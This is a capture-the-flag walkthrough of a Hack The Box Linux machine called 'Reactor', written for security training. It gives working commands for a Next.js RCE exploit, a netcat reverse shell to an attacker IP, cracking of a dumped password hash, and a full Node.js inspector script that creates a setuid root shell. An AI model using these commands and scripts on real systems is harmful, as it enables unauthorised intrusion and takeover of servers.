# Reactor — Hack The Box Writeup

**Machine:** Reator  
**Difficulty:** Easy   
**OS:** Linux   
**Date Completed:** May 2026   

---

## Summary

Reactor is an Easy Linux box running a Next.js web app (ReactorWatch) vulnerable to CVE-2025-55182 — an unauthenticated Remote Code Execution flaw in Next.js RSC. Initial access is gained as `node` via a reverse shell. Credentials stored in a local SQLite database are cracked to pivot to the `engineer` user. Privilege escalation exploits a root-owned Node.js process running with `--inspect` exposed on localhost, allowing CDP (Chrome DevTools Protocol) code execution as root.

---

## Enumeration

### Nmap

```bash
sudo nmap -sV -sC -p- -T4 10.129.5.36
```

Two open ports:

| Port | Service | Details |
|------|---------|---------|
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu |
| 3000 | HTTP    | Next.js app (`X-Powered-By: Next.js`) |

### Web Enumeration

Visiting `http://10.129.5.36:3000` reveals **ReactorWatch**, a nuclear reactor core monitoring dashboard (a fictional CTF theme). The response headers confirm Next.js.

```bash
gobuster dir -u http://10.129.5.36:3000 -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

Notable result: `/.git/logs/` redirects — hints at a git-backed deployment.

Subdomain fuzzing with `ffuf` yields no results.

---

## Initial Access — CVE-2025-55182 (Next.js RCE)

The app runs **Next.js v15.0.3**, which is vulnerable to **CVE-2025-55182**, an unauthenticated RCE via the React Server Components (RSC) endpoint.

### Exploit

```bash
git clone https://github.com/ynsmroztas/NextRce.git
cd NextRce
python3 -m venv venv && source venv/bin/activate
pip install requests
```

Verify RCE:
```bash
python3 nextrce.py -u http://10.129.5.36:3000 -c id
# Output: uid=999(node) gid=988(node) groups=988(node)
```

Reverse shell:
```bash
python3 nextrce.py -u http://10.129.5.36:3000 -c \
  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.15.232 4444 >/tmp/f"
```

Catch with:
```bash
nc -lvnp 4444
```

Stabilize the shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

Shell obtained as: `node@reactor`

---

## Lateral Movement — node → engineer

### Credentials in .env

```bash
cat /opt/reactor-app/.env
```

Reveals `DB_PATH=/opt/reactor-app/reactor.db` (SQLite).

### Dumping the Database

```bash
sqlite3 /opt/reactor-app/reactor.db
.tables
select * from users;
```

Output:
```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

### Cracking the Hash

The MD5 hash for `engineer` is cracked via [CrackStation](https://crackstation.net):

```
39d97110eafe2a9a68639812cd271e8e → reactor1
```

### SSH as engineer

```bash
ssh engineer@10.129.5.36
# Password: reactor1
```

**User flag:** `cat ~/user.txt`

---

## Privilege Escalation — Node.js Inspector (--inspect RCE as root)

### Discovery

LinPEAS / process enumeration reveals:

```
root  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

A root-owned Node.js process is running with the debug inspector bound to localhost port 9229. Confirmed with:

```bash
ss -tulpn
curl http://127.0.0.1:9229/json
```

The CDP endpoint exposes a WebSocket debugger URL:
```
ws://127.0.0.1:9229/<UUID>
```

### The Attack

The Node.js `--inspect` flag opens the Chrome DevTools Protocol. Any local user can connect and execute arbitrary JavaScript in the context of that process — which runs as **root**.

### exploit.js

```javascript
const WebSocket = require('/opt/reactor-app/node_modules/next/dist/compiled/ws');

const ws = new WebSocket('ws://127.0.0.1:9229/<UUID-FROM-JSON-ENDPOINT>');

ws.on('open', () => {
  const payload = {
    id: 1,
    method: "Runtime.evaluate",
    params: {
      expression: `process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash').toString()`,
      returnByValue: true
    }
  };
  ws.send(JSON.stringify(payload));
});

ws.on('message', (data) => {
  console.log('Response:', data.toString());
  ws.close();
});
```

> **Note:** `require` is not available directly in the evaluated expression because the worker uses ES modules. `process.mainModule.require` bypasses this.

> **Note:** The `ws` module is not installed system-wide. It is borrowed from the Next.js app's compiled dependencies at `/opt/reactor-app/node_modules/next/dist/compiled/ws`.

Run it:
```bash
node exploit.js
# Response: {"id":1,"result":{"result":{"type":"string","value":""}}}
```

### Root Shell

```bash
/tmp/rootbash -p
whoami   # root
cat /root/root.txt
```

**Root flag obtained.**

---

<img width="1196" height="672" alt="Screenshot 2026-05-27 205216" src="https://github.com/user-attachments/assets/4620fd7c-da3b-4df1-88f0-e55b9fefa0d4" />

---

## Key Takeaways

- **CVE-2025-55182** is a critical unauthenticated RCE in Next.js affecting the RSC pipeline — always check framework versions on web targets.
- **SQLite databases** in app directories often hold credentials; `.env` files are a reliable pointer to them.
- **Node.js `--inspect` on localhost** is a classic privesc vector when running as a privileged user — any local user can attach via CDP and execute code in that process's context.
- When `require` is unavailable in an evaluated expression, `process.mainModule.require` is a reliable fallback.

